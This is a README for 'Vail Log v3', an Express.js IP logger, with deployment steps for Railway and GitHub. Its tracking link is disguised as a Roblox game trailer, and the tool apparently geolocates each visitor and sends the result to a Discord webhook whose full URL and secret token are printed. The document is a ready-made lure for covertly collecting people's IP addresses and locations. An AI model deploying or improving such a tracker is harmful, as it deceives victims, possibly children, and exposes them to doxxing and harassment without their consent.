# Vail Log v3

IP logger built with Express.js.

## Files
| File | Purpose |
|------|---------|
| `index.js` | Express server — handles tracking, geo, Discord webhook |
| `package.json` | Node.js dependencies |
| `Procfile` | Tells Railway/Render/Heroku how to start the app |

## Deploy (Railway)

### Railway
1. Create free account at the platform
2. New project → deploy from GitHub, OR use their CLI
3. Upload/connect these files
4. Set env var if needed: `PORT` (usually auto-set)
5. Your link: `https://Robloxgametrailer.up.railway.app/Link`

### GitHub method (easiest)
1. Create a new GitHub repo
2. Push these 4 files to it
3. Connect your GitHub repo to the platform
4. Auto-deploys on every push

## Tracking link
```
https://Robloxgametrailer.up.railway.app/Link
```

## Geo API
Uses ip-api.com free tier — 45 req/min.
For higher traffic swap fetchGeo() for a paid API.

## Discord webhook
Pre-configured: https://discord.com/api/webhooks/1570152307923099810/Lcv3-_cVuZg5utT1xn9Je1-ln7l6j9a6PQZIdWaOn1PARv5NKW0YZdi5nYI7FzblVicJ
